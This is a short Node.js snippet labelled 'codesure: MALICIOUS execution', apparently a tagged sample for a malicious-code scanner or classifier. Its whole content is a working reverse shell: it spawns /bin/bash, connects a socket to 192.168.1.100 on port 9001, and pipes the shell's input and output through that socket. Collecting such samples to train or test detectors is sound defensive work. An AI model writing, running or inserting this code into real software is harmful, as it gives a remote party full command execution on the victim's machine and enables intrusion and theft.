// codesure: MALICIOUS execution
const net = require('net');
const cp = require('child_process');
const shell = cp.spawn('/bin/bash', []);
const socket = new net.Socket();
socket.connect(9001, '192.168.1.100', () => { socket.pipe(shell.stdin); shell.stdout.pipe(socket); });
